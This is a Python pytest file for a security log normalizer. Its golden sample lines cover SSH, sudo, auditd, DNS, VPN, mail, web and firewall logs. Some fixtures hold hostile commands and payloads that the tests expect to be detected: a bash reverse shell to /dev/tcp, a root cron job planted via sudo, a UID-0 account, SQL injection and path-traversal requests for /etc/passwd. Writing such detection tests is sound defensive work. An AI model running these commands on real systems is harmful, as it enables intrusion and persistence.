"""
tests/test_parse_contracts.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Golden log contract testleri.

Her kaynak için "golden log" satırları — regex drift, format değişikliği
veya yanlış field ataması bu testlerle anında yakalanır.

Kural: test geçiyorsa parse doğru, geçmiyorsa normalize.py bozulmuş.
"""

import sys
import time
import pytest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from core.normalize import Normalizer, SyslogParser, AuditdParser, WebLogParser, UFWParser

# ── Fixture ───────────────────────────────────────────────────────────────────

@pytest.fixture
def normalizer():
    return Normalizer()

@pytest.fixture
def syslog():
    return SyslogParser()

@pytest.fixture
def auditd():
    return AuditdParser()

@pytest.fixture
def web():
    return WebLogParser()

@pytest.fixture
def ufw():
    return UFWParser()


# ── SSH ───────────────────────────────────────────────────────────────────────

class TestSSHParse:
    ACCEPTED = "Mar  5 12:34:56 myhost sshd[1234]: Accepted password for root from 192.168.1.100 port 22345 ssh2"
    FAILED   = "Mar  5 12:35:00 myhost sshd[1235]: Failed password for admin from 10.0.0.1 port 54321 ssh2"
    INVALID  = "Mar  5 12:36:00 myhost sshd[1236]: Invalid user testuser from 192.168.1.200"
    ISO_TS   = "2026-03-05T12:34:56.000000+03:00 myhost sshd[999]: Accepted publickey for alice from 10.0.0.5 port 44321 ssh2"

    def test_ssh_success_category(self, syslog):
        evt = syslog.parse_line(self.ACCEPTED, "auth.log")
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action   == "ssh_login"
        assert evt.outcome  == "success"

    def test_ssh_success_fields(self, syslog):
        evt = syslog.parse_line(self.ACCEPTED, "auth.log")
        assert evt.user   == "root"
        assert evt.src_ip == "192.168.1.100"
        assert evt.fields.get("auth_method") == "password"

    def test_ssh_fail_category(self, syslog):
        evt = syslog.parse_line(self.FAILED, "auth.log")
        assert evt.outcome == "failure"
        assert evt.user    == "admin"
        assert evt.src_ip  == "10.0.0.1"

    def test_ssh_invalid_user_failed_password_marks_field(self, syslog):
        line = "Mar  5 12:35:00 myhost sshd[1235]: Failed password for invalid user oracle from 10.0.0.1 port 54321 ssh2"
        evt = syslog.parse_line(line, "auth.log")
        assert evt.outcome == "failure"
        assert evt.action == "ssh_login"
        assert evt.user == "oracle"
        assert evt.fields.get("invalid_user") is True

    def test_ssh_invalid_user(self, syslog):
        evt = syslog.parse_line(self.INVALID, "auth.log")
        assert evt.action  == "ssh_invalid_user"
        assert evt.outcome == "failure"
        assert evt.user    == "testuser"
        assert evt.src_ip  == "192.168.1.200"

    def test_iso_timestamp_parse(self, syslog):
        evt = syslog.parse_line(self.ISO_TS, "auth.log")
        assert evt is not None
        assert evt.user   == "alice"
        assert evt.src_ip == "10.0.0.5"
        assert evt.ts     > 0

    def test_raw_field_preserved(self, syslog):
        evt = syslog.parse_line(self.ACCEPTED, "auth.log")
        assert evt.raw == self.ACCEPTED


# ── Sudo ──────────────────────────────────────────────────────────────────────

class TestSudoParse:
    SUDO_OK   = "Mar  5 12:35:30 myhost sudo[999]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash"
    SUDO_FAIL = "Mar  5 12:36:00 myhost sudo[998]: mslm : authentication failure"
    SUDO_LOTL = "Mar  5 12:37:00 myhost sudo[997]: bob : TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=bash -i >&/dev/tcp/10.0.0.1/4444"
    SSHD_PAM_FAIL = (
        "Mar  5 12:38:00 myhost sshd[996]: "
        "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh "
        "ruser= rhost=203.0.113.10 user=alice"
    )
    SUDO_CRON_WRAP = (
        "Mar  5 12:39:00 myhost sudo[995]: alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; "
        "COMMAND=/bin/sh -c 'echo * * * * * root /tmp/run.sh > /etc/cron.d/aegis'"
    )

    def test_sudo_success(self, syslog):
        evt = syslog.parse_line(self.SUDO_OK, "auth.log")
        assert evt.action  == "sudo"
        assert evt.outcome == "success"
        assert evt.user    == "alice"
        assert evt.fields.get("sudo_target_user") == "root"

    def test_sudo_fail(self, syslog):
        evt = syslog.parse_line(self.SUDO_FAIL, "auth.log")
        assert evt.outcome == "failure"
        assert evt.action  in ("sudo_fail", "sudo")
        assert evt.fields.get("auth_service") == "sudo"

    def test_sshd_pam_failure_is_not_parsed_as_sudo_fail(self, syslog):
        evt = syslog.parse_line(self.SSHD_PAM_FAIL, "auth.log")
        assert evt.action != "sudo_fail"

    def test_sudo_cron_wrapper_command_is_sanitized_but_keeps_target(self, syslog):
        evt = syslog.parse_line(self.SUDO_CRON_WRAP, "auth.log")
        assert evt.action == "sudo"
        assert evt.fields.get("sudo_command_raw", "").endswith("> /etc/cron.d/aegis'")
        assert evt.fields.get("sudo_command") == "/bin/sh -c '<cron_redir> > /etc/cron.d/aegis'"

    def test_sudo_lotl_detection(self, syslog):
        evt = syslog.parse_line(self.SUDO_LOTL, "auth.log")
        assert evt.action  == "lotl_exec"
        assert evt.fields.get("lotl") is True
        assert "bash_reverse_shell" in evt.fields.get("attack", "")


class TestUserAddParse:
    USERADD_NORMAL = "Mar  5 12:40:00 myhost useradd[995]: new user: name=testuser, UID=1001, GID=1001, home=/home/testuser, shell=/bin/bash"
    USERADD_UID0 = "Mar  5 12:41:00 myhost useradd[994]: new user: name=rootclone, UID=0, GID=0, home=/home/rootclone, shell=/bin/bash"

    def test_useradd_extracts_created_uid(self, syslog):
        evt = syslog.parse_line(self.USERADD_NORMAL, "auth.log")
        assert evt.action == "useradd"
        assert evt.user == "testuser"
        assert evt.fields.get("new_user_uid") == "1001"

    def test_useradd_uid_zero_extracts_created_uid(self, syslog):
        evt = syslog.parse_line(self.USERADD_UID0, "auth.log")
        assert evt.action == "useradd"
        assert evt.user == "rootclone"
        assert evt.fields.get("new_user_uid") == "0"
        assert evt.fields["identity"] == {
            "mechanism": "local",
            "service": "useradd",
            "phase": "account",
            "account": "rootclone",
            "policy": "created",
        }


class TestCronSafetyParse:
    DEBIAN_SA1 = "Mar  5 12:50:00 myhost CRON[994]: (root) CMD (/usr/lib/sysstat/debian-sa1 1 1)"
    ANACRON = "Mar  5 12:51:00 myhost CRON[995]: (root) CMD (/usr/sbin/anacron -s)"

    def test_debian_sa1_marked_cron_safe(self, syslog):
        evt = syslog.parse_line(self.DEBIAN_SA1, "syslog")
        assert evt.action == "cron_exec"
        assert evt.fields.get("cron_safe") is True

    def test_anacron_marked_cron_safe(self, syslog):
        evt = syslog.parse_line(self.ANACRON, "syslog")
        assert evt.action == "cron_exec"
        assert evt.fields.get("cron_safe") is True


class TestDNSParse:
    NAMED_QUERY = (
        "Apr  8 12:00:00 dns named[123]: client @0x7f 192.0.2.44#53000 "
        "(payload.example.com): query: payload.example.com IN TXT +"
    )
    NAMED_NXDOMAIN = (
        "Apr  8 12:00:10 dns named[123]: client @0x7f 192.0.2.44#53000 "
        "(lookup-001.lookup-002.example.com): query failed (NXDOMAIN) for "
        "lookup-001.lookup-002.example.com/IN/A at query.c:123"
    )

    def test_named_query_dns_fields(self, normalizer):
        evt = normalizer.normalize(self.NAMED_QUERY, "named")
        assert evt is not None
        assert evt.action == "dns_query"
        assert evt.outcome == "unknown"
        assert evt.src_ip == "192.0.2.44"
        assert evt.fields["domain"] == "payload.example.com"
        assert evt.fields["qtype"] == "TXT"
        assert evt.fields["entropy"] >= 0

    def test_named_nxdomain_maps_to_failure(self, normalizer):
        evt = normalizer.normalize(self.NAMED_NXDOMAIN, "named")
        assert evt is not None
        assert evt.action == "dns_query"
        assert evt.outcome == "failure"
        assert evt.src_ip == "192.0.2.44"
        assert evt.fields["domain"] == "lookup-001.lookup-002.example.com"
        assert evt.fields["qtype"] == "A"


class TestIdentityParse:
    SSH_OK = "Mar  5 12:41:30 myhost sshd[2001]: Accepted password for alice from 203.0.113.10 port 55222 ssh2"
    SSSD_OK = "Mar  5 12:42:30 myhost sshd[2002]: pam_sss(sshd:auth): authentication success; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice"
    WINBIND_POLICY = "Mar  5 12:44:10 myhost sshd[2003]: pam_winbind(sshd:account): request failed, NT_STATUS_ACCOUNT_DISABLED for user 'EXAMPLE\\\\alice'"

    def test_ssh_success_identity_bag(self, syslog):
        evt = syslog.parse_line(self.SSH_OK, "auth.log")

        assert evt is not None
        assert evt.action == "ssh_login"
        assert evt.outcome == "success"
        assert evt.fields["identity"] == {
            "mechanism": "ssh",
            "service": "sshd",
            "phase": "auth",
            "account": "alice",
        }

    def test_sssd_success_identity_bag(self, syslog):
        evt = syslog.parse_line(self.SSSD_OK, "auth.log")

        assert evt is not None
        assert evt.action == "identity_login"
        assert evt.outcome == "success"
        assert evt.fields["identity"] == {
            "mechanism": "sssd",
            "service": "sshd",
            "phase": "auth",
            "account": "alice",
        }

    def test_winbind_policy_identity_bag(self, syslog):
        evt = syslog.parse_line(self.WINBIND_POLICY, "auth.log")

        assert evt is not None
        assert evt.action == "account_policy"
        assert evt.outcome == "failure"
        assert evt.fields["identity"] == {
            "mechanism": "winbind",
            "service": "sshd",
            "phase": "account",
            "account": "alice",
            "domain": "EXAMPLE",
            "policy": "account_disabled",
        }
        assert evt.fields["identity_policy_code"] == "NT_STATUS_ACCOUNT_DISABLED"

    def test_journald_identity_context_uses_unit(self, normalizer):
        raw = (
            '{"__REALTIME_TIMESTAMP":"1710000000123456","MESSAGE":"pam_winbind(sshd:auth): user '
            '\\\"EXAMPLE\\\\\\\\alice\\\" granted access",'
            '"_COMM":"winbindd","_PID":"1234","_HOSTNAME":"node-1","_SYSTEMD_UNIT":"winbind.service"}'
        )

        evt = normalizer.normalize(raw, "journald")

        assert evt is not None
        assert evt.action == "identity_login"
        assert evt.fields["identity"] == {
            "mechanism": "winbind",
            "service": "sshd",
            "phase": "auth",
            "account": "alice",
            "domain": "EXAMPLE",
            "unit": "winbind.service",
        }


class TestVpnAndMailBags:
    def test_journald_openvpn_uses_metadata_unit(self, normalizer):
        raw = (
            '{"__REALTIME_TIMESTAMP":"1710000000123456","MESSAGE":"client1/198.51.100.25:54321 '
            'Peer Connection Initiated with [AF_INET]198.51.100.25:54321",'
            '"_COMM":"openvpn","_PID":"1234","_HOSTNAME":"node-1","_SYSTEMD_UNIT":"openvpn-server@server.service"}'
        )

        evt = normalizer.normalize(raw, "journald")

        assert evt is not None
        assert evt.action == "vpn_login"
        assert evt.fields["vpn"] == {
            "common_name": "client1",
            "peer_ip": "198.51.100.25",
            "peer_port": "54321",
            "session_state": "connected",
            "unit": "openvpn-server@server.service",
            "service": "openvpn",
        }

    def test_postfix_success_mail_bag(self, normalizer):
        raw = (
            "Mar  5 12:35:15 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: "
            "SASL LOGIN authentication succeeded: sasl_username=alice"
        )

        evt = normalizer.normalize(raw, "mail")

        assert evt is not None
        assert evt.action == "smtp_login"
        assert evt.outcome == "success"
        assert evt.fields["mail"] == {
            "service": "postfix/smtpd",
            "peer": "unknown",
            "sasl_method": "LOGIN",
            "sasl_username": "alice",
        }

    def test_journald_wireguard_uses_metadata_unit(self, normalizer):
        raw = (
            '{"__REALTIME_TIMESTAMP":"1710000000123456","MESSAGE":"wireguard: wg0: Handshake for peer peerA '
            'from 198.51.100.50:51820 completed",'
            '"_COMM":"kernel","_PID":"0","_HOSTNAME":"node-1","_SYSTEMD_UNIT":"wg-quick@wg0.service","SYSLOG_IDENTIFIER":"kernel"}'
        )

        evt = normalizer.normalize(raw, "journald")

        assert evt is not None
        assert evt.action == "vpn_login"
        assert evt.fields["vpn"] == {
            "provider": "wireguard",
            "tunnel": "wg0",
            "peer_id": "peerA",
            "peer_ip": "198.51.100.50",
            "peer_port": "51820",
            "session_state": "connected",
            "unit": "wg-quick@wg0.service",
            "service": "kernel",
        }


    def test_journald_nftables_uses_metadata_unit(self, normalizer):
        raw = (
            '{"__REALTIME_TIMESTAMP":"1710000000123456","MESSAGE":"nftables: DROP TABLE=inet CHAIN=input IN=eth0 OUT= '
            'SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP SPT=45678 DPT=22",'
            '"_COMM":"kernel","_PID":"0","_HOSTNAME":"node-1","_SYSTEMD_UNIT":"nftables.service","SYSLOG_IDENTIFIER":"kernel"}'
        )

        evt = normalizer.normalize(raw, "journald")

        assert evt is not None
        assert evt.action == "firewall_block"
        assert evt.fields["firewall"] == {
            "provider": "nftables",
            "verdict": "drop",
            "table": "inet",
            "chain": "input",
            "in_interface": "eth0",
            "protocol": "TCP",
            "src_port": "45678",
            "dst_port": "22",
            "unit": "nftables.service",
            "service": "kernel",
        }

    def test_unsupported_snapshot_sources_are_unknown(self, normalizer):
        faillog_evt = normalizer.normalize(
            "root            3        03/05/26 12:35:00 +0300  203.0.113.5",
            "faillog",
        )
        lastlog_evt = normalizer.normalize(
            "alice           pts/0    203.0.113.10     Tue Mar  5 12:34:00 +0300 2026",
            "lastlog",
        )

        assert faillog_evt.category == "unknown"
        assert lastlog_evt.category == "unknown"


# ── Auditd ────────────────────────────────────────────────────────────────────

class TestAuditdParse:
    EXECVE = (
        'type=EXECVE msg=audit(1234567890.123:456): argc=3 '
        'a0="/usr/bin/python3" a1="-c" a2="import socket; s=socket.socket()"'
    )
    PATH_WRITE = (
        'type=PATH msg=audit(1234567890.000:100): item=0 '
        'name="/etc/passwd" nametype=CREATE oflags=0x1'
    )
    PATH_REPO_WRITE = (
        'type=PATH msg=audit(1234567890.000:101): item=0 '
        'name="/etc/yum.repos.d/evil.repo" nametype=CREATE oflags=0x1 comm="vim" exe="/usr/bin/vim"'
    )
    SYSCALL = (
        'type=SYSCALL msg=audit(1234567890.001:200): arch=c000003e syscall=59 '
        'success=yes pid=1234 ppid=1000 uid=0 auid=1000 comm="bash" exe="/bin/bash"'
    )

    def test_execve_lotl(self, auditd):
        evt = auditd.parse_line(self.EXECVE)
        assert evt is not None
        assert evt.action  == "lotl_exec"
        assert evt.fields.get("lotl") is True

    def test_path_sensitive_write(self, auditd):
        evt = auditd.parse_line(self.PATH_WRITE)
        assert evt is not None
        assert evt.action == "sensitive_file_access"
        assert evt.fields.get("sensitive") is True

    def test_repo_path_sensitive_write(self, auditd):
        evt = auditd.parse_line(self.PATH_REPO_WRITE)
        assert evt is not None
        assert evt.action == "sensitive_file_access"
        assert evt.fields.get("file_path") == "/etc/yum.repos.d/evil.repo"

    def test_syscall_parse(self, auditd):
        evt = auditd.parse_line(self.SYSCALL)
        assert evt is not None
        assert evt.category == "process"
        assert int(evt.pid)  == 1234
        assert evt.fields.get("syscall_name") == "execve"

    def test_invalid_line_returns_none(self, auditd):
        evt = auditd.parse_line("bu bir auditd satiri degil")
        assert evt is None


# ── Web log ───────────────────────────────────────────────────────────────────

class TestWebLogParse:
    SQLI = '10.0.0.1 - - [05/Mar/2026:12:00:00 +0000] "GET /search?q=1+UNION+SELECT+1,2,3 HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
    SCANNER = '10.0.0.2 - - [05/Mar/2026:12:01:00 +0000] "GET /admin HTTP/1.1" 404 0 "-" "sqlmap/1.7"'
    NIKTO = '10.0.0.5 - - [05/Mar/2026:12:01:30 +0000] "GET /admin/../../../etc/passwd HTTP/1.1" 404 0 "-" "nikto/2.1.6"'
    TRAVERSAL = '10.0.0.3 - - [05/Mar/2026:12:02:00 +0000] "GET /../../etc/passwd HTTP/1.1" 403 0 "-" "curl/7.0"'
    NORMAL = '10.0.0.4 - - [05/Mar/2026:12:03:00 +0000] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"'
    VHOST = 'example.com:80 10.0.0.6 - - [05/Mar/2026:12:04:00 +0000] "GET / HTTP/1.1" 200 64 "-" "curl/8.0"'
    MALFORMED = '10.0.0.7 - - [05/Mar/2026:12:05:00 +0000] "GET /wp-login.php?id=%27" 400 0 "-" "curl/8.0"'
    APACHE_AH = '[Wed Mar 05 12:06:00.123456 2026] [core:error] [pid 1234:tid 140012345678912] [client 203.0.113.9:54444] AH10244: invalid URI path (/..%2f..%2fetc/passwd)'
    APACHE_PHP = '[Wed Mar 05 12:06:30.123456 2026] [php:error] [pid 1235] [client 198.51.100.7:60000] PHP Fatal error: Uncaught Error: Call to undefined function foo()'

    def test_sqli_detection(self, web):
        evt = web.parse_line(self.SQLI)
        assert evt.action == "sqli_attempt"
        assert evt.fields.get("attack") == "sql_injection"

    def test_scanner_detection(self, web):
        evt = web.parse_line(self.SCANNER)
        assert evt.action == "scanner_detected"

    def test_nikto_detection(self, web):
        evt = web.parse_line(self.NIKTO)
        assert evt.action == "path_traversal"
        assert evt.fields.get("attack") == "path_traversal"

    def test_path_traversal(self, web):
        evt = web.parse_line(self.TRAVERSAL)
        assert evt.action == "path_traversal"

    def test_normal_request(self, web):
        evt = web.parse_line(self.NORMAL)
        assert evt.action  == "http_request"
        assert evt.outcome == "success"
        assert evt.src_ip  == "10.0.0.4"

    def test_vhost_access_prefix(self, web):
        evt = web.parse_line(self.VHOST)
        assert evt.action == "http_request"
        assert evt.src_ip == "10.0.0.6"
        assert evt.fields.get("vhost") == "example.com:80"

    def test_malformed_request_is_controlled(self, web):
        evt = web.parse_line(self.MALFORMED)
        assert evt.action == "http_request"
        assert evt.outcome == "failure"
        assert evt.fields.get("request_malformed") is True
        assert evt.fields.get("path") == "/wp-login.php?id=%27"

    def test_apache_error_ah10244(self, web):
        evt = web.parse_line(self.APACHE_AH, "apache2")
        assert evt.action == "http_error"
        assert evt.outcome == "failure"
        assert evt.src_ip == "203.0.113.9"
        assert evt.pid == 1234
        assert evt.fields.get("module") == "core"
        assert evt.fields.get("severity") == "error"
        assert evt.fields.get("tid") == "140012345678912"
        assert evt.fields.get("client_port") == "54444"
        assert evt.fields.get("ah_code") == "AH10244"

    def test_apache_php_error(self, web):
        evt = web.parse_line(self.APACHE_PHP, "apache2")
        assert evt.action == "http_error"
        assert evt.src_ip == "198.51.100.7"
        assert evt.fields.get("module") == "php"
        assert evt.fields.get("severity") == "error"
        assert "PHP Fatal error" in evt.message


# ── UFW ───────────────────────────────────────────────────────────────────────

class TestUFWParse:
    BLOCK = "Mar  5 12:00:00 myhost kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.50 DST=10.0.0.1 SPT=1234 DPT=22"
    ALLOW = "Mar  5 12:01:00 myhost kernel: [UFW ALLOW] IN=eth0 OUT= SRC=10.0.0.2 DST=10.0.0.1 DPT=80"

    def test_ufw_block(self, ufw):
        evt = ufw.parse_line(self.BLOCK)
        assert evt is not None
        assert evt.action  == "firewall_block"
        assert evt.outcome == "blocked"
        assert evt.src_ip  == "192.168.1.50"
        assert evt.fields.get("dst_port") == "22"

    def test_ufw_allow(self, ufw):
        evt = ufw.parse_line(self.ALLOW)
        assert evt.action  == "firewall_allow"
        assert evt.outcome == "allowed"


# ── Normalizer (Top Level) ────────────────────────────────────────────

class TestNormalizerContract:
    def test_never_returns_none(self, normalizer):
        """normalize() must never return None."""
        result = normalizer.normalize("", "syslog")
        assert result is not None

    def test_empty_line_fallback(self, normalizer):
        evt = normalizer.normalize("   ", "auth.log")
        assert evt.category == "unknown"
        assert evt.source   == "auth.log"

    def test_unknown_source_no_crash(self, normalizer):
        evt = normalizer.normalize("some random log line", "unknown_src")
        assert evt is not None
        assert evt.source == "unknown_src"

    def test_ts_always_set(self, normalizer):
        evt = normalizer.normalize("garbage line", "syslog")
        assert evt.ts > 0

    def test_parse_fail_stats_tracked(self, normalizer):
        """parse_fail_stats() should return source-based statistics."""
        # Intentional failure
        for _ in range(5):
            normalizer.normalize("bu auditd formatı değil", "auditd")
        stats = normalizer.parse_fail_stats()
        assert "auditd" in stats
        assert stats["auditd"]["total"] >= 5

    def test_stats_success_counted(self, normalizer):
        line = "Mar  5 12:34:56 host sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2"
        normalizer.normalize(line, "auth.log")
        s = normalizer.stats()
        assert s["parsed"] >= 1

    def test_missing_field_no_crash(self, normalizer):
        """An empty user/src_ip warning must not raise an exception."""
        line = "Mar  5 12:34:56 host sshd[1]: Failed password for invalid user from  port 22 ssh2"
        evt = normalizer.normalize(line, "auth.log")
        assert evt is not None

    def test_journald_metadata_preserved(self, normalizer):
        raw = (
            '{"__REALTIME_TIMESTAMP":"1710000000123456","MESSAGE":"Accepted password for root from 1.2.3.4 port 22 ssh2",'
            '"_COMM":"sshd","_EXE":"/usr/sbin/sshd","_CMDLINE":"sshd: root [priv]","_PID":"1234",'
            '"_UID":"0","_GID":"0","_HOSTNAME":"node-1","_BOOT_ID":"boot-123","_TRANSPORT":"syslog",'
            '"MESSAGE_ID":"msg-123","_SYSTEMD_UNIT":"sshd.service","SYSLOG_IDENTIFIER":"sshd"}'
        )

        evt = normalizer.normalize(raw, "journald")

        assert evt.source == "journald"
        assert evt.action == "ssh_login"
        assert evt.outcome == "success"
        assert evt.fields["metadata"]["journald"] == {
            "systemd_unit": "sshd.service",
            "syslog_identifier": "sshd",
            "comm": "sshd",
            "exe": "/usr/sbin/sshd",
            "cmdline": "sshd: root [priv]",
            "pid": "1234",
            "uid": "0",
            "gid": "0",
            "hostname": "node-1",
            "boot_id": "boot-123",
            "transport": "syslog",
            "message_id": "msg-123",
        }

    def test_journald_metadata_omits_missing_fields(self, normalizer):
        raw = (
            '{"__REALTIME_TIMESTAMP":"1710000000123456","MESSAGE":"systemd started",'
            '"_COMM":"systemd","_PID":"1","_HOSTNAME":"node-1"}'
        )

        evt = normalizer.normalize(raw, "journald")

        assert evt.source == "journald"
        assert evt.fields["metadata"]["journald"] == {
            "comm": "systemd",
            "pid": "1",
            "hostname": "node-1",
        }
        assert "systemd_unit" not in evt.fields["metadata"]["journald"]
        assert "boot_id" not in evt.fields["metadata"]["journald"]
        assert "uid" not in evt.fields["metadata"]["journald"]

    def test_non_journald_sources_unaffected_by_metadata_bag(self, normalizer):
        line = "Mar  5 12:34:56 host sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2"

        evt = normalizer.normalize(line, "auth.log")

        assert evt.source == "auth.log"
        assert evt.fields["metadata"]["duplicate_candidate"]["family"] == "auth_login"
        assert evt.fields["metadata"]["duplicate_candidate"]["kind"] == "login_success"
        assert evt.fields["metadata"]["duplicate_candidate"]["source_class"] == "auth_log"

    def test_wtmp_duplicate_candidate_added(self, normalizer):
        evt = normalizer.normalize(
            "alice    pts/0        192.168.1.10     Mon Mar  5 12:34   still logged in",
            "wtmp"
        )

        assert evt.fields["metadata"]["duplicate_candidate"]["family"] == "auth_login"
        assert evt.fields["metadata"]["duplicate_candidate"]["kind"] == "login_success"
        assert evt.fields["metadata"]["duplicate_candidate"]["source_class"] == "accounting"
        assert evt.fields["metadata"]["duplicate_candidate"]["fingerprint"]
        assert evt.fields["metadata"]["duplicate_policy"] == {
            "family": "auth_login",
            "source_rank": 1,
            "preferred_source_class": "auth_log",
            "event_source_class": "accounting",
        }

    def test_btmp_duplicate_candidate_added(self, normalizer):
        evt = normalizer.normalize(
            "root     ssh:notty    203.0.113.5      Mon Mar  5 12:35 - 12:35  (00:00)",
            "btmp"
        )

        assert evt.fields["metadata"]["duplicate_candidate"]["family"] == "auth_login"
        assert evt.fields["metadata"]["duplicate_candidate"]["kind"] == "login_failed"
        assert evt.fields["metadata"]["duplicate_candidate"]["source_class"] == "accounting"
        assert evt.fields["metadata"]["duplicate_policy"]["source_rank"] == 1
        assert evt.fields["metadata"]["duplicate_policy"]["preferred_source_class"] == "auth_log"
        assert evt.fields["metadata"]["duplicate_policy"]["event_source_class"] == "accounting"

    def test_duplicate_candidate_omitted_without_fingerprint_fields(self, normalizer):
        evt = normalizer.normalize(
            "Mar  5 12:35:10 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN authentication failed: authentication failure",
            "mail"
        )

        assert evt.category == "auth"
        assert "metadata" not in evt.fields

    def test_journald_duplicate_candidate_preserves_journald_metadata(self, normalizer):
        raw = (
            '{"__REALTIME_TIMESTAMP":"1710000000123456","MESSAGE":"Accepted password for root from 1.2.3.4 port 22 ssh2",'
            '"_COMM":"sshd","_PID":"1234","_HOSTNAME":"node-1","_SYSTEMD_UNIT":"sshd.service","SYSLOG_IDENTIFIER":"sshd"}'
        )

        evt = normalizer.normalize(raw, "journald")

        assert evt.fields["metadata"]["journald"]["systemd_unit"] == "sshd.service"
        assert evt.fields["metadata"]["duplicate_candidate"]["family"] == "auth_login"
        assert evt.fields["metadata"]["duplicate_candidate"]["kind"] == "login_success"
        assert evt.fields["metadata"]["duplicate_candidate"]["source_class"] == "auth_log"
        assert evt.fields["metadata"]["duplicate_policy"] == {
            "family": "auth_login",
            "source_rank": 2,
            "preferred_source_class": "auth_log",
            "event_source_class": "auth_log",
        }


# ── Source-Based Failure-Rate Logic ───────────────────────────────────

class TestParseFailStats:
    def test_fail_rate_calculation(self, normalizer):
        """The failure rate should be calculated correctly."""
        # 10 failed auditd lines
        for _ in range(10):
            normalizer.normalize("not auditd format at all xxx", "auditd")
        stats = normalizer.parse_fail_stats()
        src = stats.get("auditd", {})
        assert src.get("total", 0) >= 10
        # fail_rate should stay within 0-1
        assert 0.0 <= src.get("fail_rate", 0) <= 1.0

    def test_high_quality_source_low_fail(self, normalizer):
        """Valid syslog lines should keep the failure rate low."""
        lines = [
            "Mar  5 12:34:56 host sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2",
            "Mar  5 12:35:00 host sudo[2]: alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls",
            "Mar  5 12:36:00 host sshd[3]: Failed password for bob from 2.3.4.5 port 9999 ssh2",
        ]
        for line in lines:
            normalizer.normalize(line, "auth.log")
        stats = normalizer.parse_fail_stats()
        src = stats.get("auth.log", {})
        # Failure rate should stay low for valid lines
        assert src.get("fail_rate", 1.0) < 0.5
